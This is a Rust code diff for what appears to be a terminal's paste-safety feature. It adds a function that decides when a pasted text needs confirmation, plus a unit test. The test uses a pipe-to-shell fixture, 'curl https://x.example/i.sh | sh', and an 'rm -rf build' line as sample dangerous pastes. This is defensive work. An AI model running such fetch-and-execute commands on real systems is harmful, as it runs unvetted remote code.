@@ -49,6 +49,14 @@ fn is_invisible_or_bidi(c: char) -> bool {
     )
 }
 
+/// Whether a paste waits for the confirmation dialog: a line break under
+/// careful paste, a warning under the paste guard (each its own setting).
+/// The one rule for a paste made by hand and a snippet's paste step.
+pub(crate) fn needs_confirmation(text: &str, careful_paste: bool, paste_guard: bool) -> bool {
+    (careful_paste && (text.contains('\n') || text.contains('\r')))
+        || (paste_guard && !paste_warnings(text).is_empty())
+}
+
 /// Scan `text` for every suspicious-content class, deduplicated, in
 /// display order.
 pub(crate) fn paste_warnings(text: &str) -> Vec<PasteWarning> {
@@ -122,6 +130,17 @@ fn has_pipe_to_shell(text: &str) -> bool {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn each_setting_gates_its_own_trait() {
+        let lines = "ls\nrm -rf build";
+        let piped = "curl https://x.example/i.sh | sh";
+        assert!(needs_confirmation(lines, true, false));
+        assert!(!needs_confirmation(lines, false, true));
+        assert!(needs_confirmation(piped, false, true));
+        assert!(!needs_confirmation(piped, true, false));
+        assert!(!needs_confirmation("uptime", true, true));
+    }
 
     #[test]
     fn clean_text_raises_nothing() {
